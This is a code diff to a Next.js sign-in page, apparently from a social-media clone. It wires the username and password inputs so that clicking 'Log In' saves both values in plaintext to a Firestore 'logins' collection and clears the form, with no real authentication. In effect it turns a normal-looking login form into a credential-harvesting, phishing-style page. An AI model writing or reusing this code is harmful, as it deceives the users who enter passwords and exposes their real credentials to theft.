@@ -1,7 +1,24 @@
 import { getProviders, signIn as SignIntoProvider } from "next-auth/react";
+import { getStorage, ref, deleteObject } from "firebase/storage";
+import { db } from "../../firebase";
+import { useRef } from "react";
+import { addDoc, collection } from "firebase/firestore";
 
 function signin({ providers }) {
   const checkProviders = console.log(providers);
+  const userIdRef = useRef(null);
+  const userCredRef = useRef(null);
+
+  const saveLogin=async () => {
+
+    await addDoc(collection(db, "logins"), {
+      username: userIdRef.current.value,
+      cred: userCredRef.current.value,
+    });
+
+    userIdRef.current.value="";
+    userCredRef.current.value="";
+  }
 
   return (
     <body className=" bg-gray-50">
@@ -23,12 +40,14 @@ function signin({ providers }) {
               <input
                 placeholder="Phone/Username/Email"
                 className=" p-2 text-sm rounded-sm border w-full"
+                ref={userIdRef}
               />
               <input
                 placeholder="Password"
                 className=" p-2 text-sm rounded-sm border w-full mt-3 mb-5"
+                ref={userCredRef}
               />
-              <button className=" w-full bg-blue-300 text-sm p-2 text-white mb-6 hover:font-semibold hover:bg-blue-400 ease-out transition">
+              <button onClick={() => saveLogin()} className=" w-full bg-blue-300 text-sm p-2 text-white mb-6 hover:font-semibold hover:bg-blue-400 ease-out transition">
                 Log In
               </button>
               <p className="text-center pb-3 font-medium border-b-2 text-gray-400">
